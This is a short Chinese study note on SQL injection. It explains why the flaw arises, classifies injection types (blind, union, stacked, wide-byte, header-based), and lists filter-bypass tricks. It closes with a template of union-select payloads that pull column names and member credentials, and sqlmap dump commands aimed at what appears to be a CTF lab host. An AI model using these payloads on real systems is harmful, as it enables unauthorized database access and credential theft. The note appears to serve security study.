sql注入原理：产生sql注入漏洞主要因为没有对接受到的参数进行过滤、验证和处理直接拼接到了sql语句中，然后直接执行该sql语句，这样就会导致恶意用户传入一些精心构造的sql代码，与后台sql语句拼接后形成完整的sql语句执行，达到攻击者的目的。
^
分类：
我们可以把sql注入直接的分为字符型和数字型，主要特点就是在进行sql注入的时候是否需要闭合传参的单引号，不需要闭合说明是数值型，反之就是字符型；
还可以将sql注入分为有回显的注入和无回显的注入，无回显的注入又别称为盲注，盲注有三大类，布尔盲注、时间盲注以及报错盲注；
根据sql注入各自的特点可以分为联合注入、二次注入、宽字节注入、堆叠注入等，
根据http报文中的不同位置可以有cookie注入、referer注入、x-forwarded-for注入等。
^
sql注入绕过：大小写绕过 、编码绕过、注释绕过、关键字/关键函数替换、参数污染、缓存区溢出、特殊符号




^
## **简单注入模板**
1. 有联合注入回显点手工注入
```
-1 union select 1,database(),GROUP_CONCAT(column_name),4 from information_schema.columns WHERE table_name='StormGroup_member'
-1 union select 1,name,password,4 from StormGroup_member limit 0,1
```
2. 不能联合注入sqlmap 
```
sqlmap -u b7fdb6ca.sqlsec.com/?id=2 --dbs -v-3 --dump -C "content" -T flag_is_here -D "db"

sqlmap -u "http" --dbms=mysql --random-agent -v 3
```
